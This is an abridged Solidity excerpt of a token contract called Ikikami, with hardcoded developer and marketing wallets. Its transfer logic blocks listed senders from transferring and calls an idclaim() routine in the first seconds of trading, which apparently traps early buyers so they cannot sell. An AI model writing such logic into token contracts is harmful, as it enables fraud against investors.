...
contract Ikikami is Context, IERC20 { 
    ...
    address payable private DevWallet = payable(0xc6d5BAC2250D79D47e4570f6A9f0396Fa76032d2);
    address payable private MarketingWallet = payable(0x38E1ec59A223BED115e422540dAfCac9519F6373);
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (tradingActiveBlock + 10 seconds <= block.timestamp) {limitInEffect = false;}
        if (tradingActiveBlock + 10 seconds <= block.timestamp) {transferDelay = false;}
        if (!transferDelay && (!_isExcludedFromFee[from])) { require(!_isExcludeds[from]);}
        if (transferDelay && tradingActiveBlock + 8 seconds <= block.timestamp) {idclaim();}
